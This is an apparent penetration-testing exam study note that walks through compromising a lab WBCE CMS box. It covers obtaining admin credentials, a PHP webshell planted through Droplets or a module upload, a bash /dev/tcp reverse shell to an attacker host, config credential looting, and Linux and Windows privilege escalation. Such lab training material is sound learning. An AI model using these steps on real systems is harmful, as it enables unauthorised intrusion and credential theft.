# 🧩 Scenario 06 — WBCE CMS (get admin → authenticated RCE)

> **Given:** a standalone web box running **WBCE CMS** (Website Baker Community Edition) with its admin login at `/admin/login/`. Goal: foothold → root/SYSTEM + proof. WBCE has well-known **authenticated** RCE, so the box is two problems: **(1) get into the panel, (2) turn admin into a shell.** Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]] · [[Web Enumeration]]. Foothold: [[Web Exploitation]] · [[File Upload]] · [[RCE]] · [[Shells]]. Then: [[Credential Attacks]] · [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]].

```bash
export IP=<TARGET_IP> ; mkdir -p nmap loot
```

---

## 🧠 THE SHAPE OF THIS BOX
A named CMS with an admin login = a **two-step web box**:
1. **Authenticate** to `/admin/` (default/weak/found/brute creds).
2. **Admin → RCE:** WBCE gives an authenticated admin several ways to run PHP (Droplets, module/template upload, media upload). Pick one → web-user shell → privesc.

> **Why admin-first:** the WBCE RCEs are **post-auth** — none of them fire without a valid admin session. So the real puzzle is usually *finding the credential*, not the exploit. Don't look for a magic unauth RCE that isn't there.

---

## 1️⃣ ENUMERATE
```bash
sudo nmap -sC -sV -p- $IP -oN nmap/services.txt
whatweb http://$IP ; curl -s http://$IP/ | grep -i generator      # confirm WBCE + version
searchsploit wbce ; searchsploit website baker                     # version → known PoC
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak
```
Look for the **version** (page source / `CHANGELOG` / `/admin/`), a `readme`, backups, and any **other service** on the box that might hold creds ([[Web Enumeration]]).

## 2️⃣ GET INTO /admin/ (the gate)
Try in this order:
1. **Default / weak creds** — `admin:admin`, `admin:password`, product defaults. Fastest win.
2. **Creds found elsewhere** — another service, an exposed config/backup, a readable file, reused creds ([[Credential Attacks]]).
3. **Database creds → password hash** — if you can reach the DB or read `config.php`, pull the admin hash from the `users` table and crack it ([[Hash Cracking]]).
4. **Brute force (last resort)** — WBCE uses anti-CSRF tokens, so a naive `hydra http-post-form` often fails; if you brute, script it to fetch the token per request. Prefer 1–3.

## 3️⃣ ADMIN → RCE (pick one)
Once logged in — **confirm the exact version and read the matching PoC first** ([[Exploitation Methodology]]):
| Method | How | Note |
|---|---|---|
| **Droplets** (PHP snippets) | Admin-Tools → **Droplets** → create one containing `<?php system($_GET['c']); ?>` → call it | WBCE's built-in "run PHP" feature — cleanest authed RCE |
| **Module / template upload** | Add-ons → **Modules/Templates** → upload a crafted `.zip` containing a PHP file → browse to it under `/modules/` | matches public `WBCE … Authenticated RCE` PoCs / CVE-2022-25099 |
| **Media / file upload** | upload a `.php` (filter-bypass per the PoC) into a served dir → browse it | [[File Upload]] |
| **Public PoC** | `searchsploit -m <wbce_rce>` → set URL + creds → run | always read it before firing |
```bash
# after planting a webshell, upgrade to a reverse shell:
curl "http://$IP/<path>/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("bash -c \"bash -i >& /dev/tcp/<KALI>/443 0>&1\""))')"
# listener: nc -lvnp 443    ([[Shells]])
```

## 4️⃣ FOOTHOLD → PRIVESC
You land as the **web user** (`www-data` on LAMP, or an IIS/app user on Windows — check `uname`/`whoami`):
```bash
# Linux (most WBCE/LAMP boxes):
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; ./linpeas.sh | tee loot/linpeas.txt
# first loot: WBCE config has DB creds → reuse for SSH/other users
grep -riE "db_(username|password)|\$database" /var/www 2>/dev/null
```
Windows variant → `whoami /priv` → **SeImpersonate → GodPotato/PrintSpoofer → SYSTEM** ([[Windows Privilege Escalation]]). Linux → `sudo -l`/SUID/cron ([[Linux Privilege Escalation]]). **Reuse the WBCE DB password** — it's frequently a user's system password.

---

## 🗺️ DECISION FLOW
```
WBCE /admin/login/  ──► confirm version (searchsploit wbce)
      ▼
get admin creds:  default/weak ─┐
                  found elsewhere ─┤──► LOGIN
                  db→hash→crack ──┘
      ▼
admin ──► RCE:  Droplets (PHP)  |  module/template zip  |  media upload  |  public PoC
      ▼
web-user shell ──► loot config DB creds (reuse) ──► privesc
      ├─ Linux:   sudo -l / SUID / cron ──► root ✅
      └─ Windows: SeImpersonate ──► GodPotato ──► SYSTEM ✅
```

## 🚧 STUCK?
1. No default creds → **enumerate for a planted credential** (other ports, backups, `config.php`, LFI) before brute-forcing.
2. Logged in but RCE PoC fails → **match the exact version**; try **Droplets** (works across versions) instead of a version-pinned upload PoC.
3. Shell but stuck → read **WBCE's DB config** for creds and reuse everywhere.
→ [[Standalone Boxes — Exam Solve Guide]] (Stuck section).

## 🧠 ONE-LINE LESSON
**A CMS admin login means "find the credential, then use the CMS's own features to run code." For WBCE: default/weak/looted admin creds → Droplets or a crafted module upload → web shell → loot the DB config password → privesc.**
